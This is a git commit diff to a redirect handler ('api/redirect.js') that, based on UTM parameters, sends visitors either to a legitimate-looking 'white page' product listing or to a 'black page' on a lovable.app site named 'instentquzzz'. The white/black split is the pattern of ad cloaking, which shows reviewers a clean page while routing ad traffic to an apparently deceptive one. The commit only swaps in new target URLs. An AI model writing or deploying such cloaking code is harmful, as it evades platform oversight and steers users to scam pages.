8addbdead8cfb16229f0372eb657c16c9962939e
abdullahch3332 <abdullahch3332@gmail.com>
2025-11-08 22:44:26 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.aflfootyshop.com.au/fremantle-dockers-babies-yay-hoodie";
-    const blackPageURL = "https://nowhereher.lovable.app//";
+    const whitePageURL = "https://shopecs.com/collections/women-watches/products/613500069x";
+    const blackPageURL = "https://instentquzzz.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
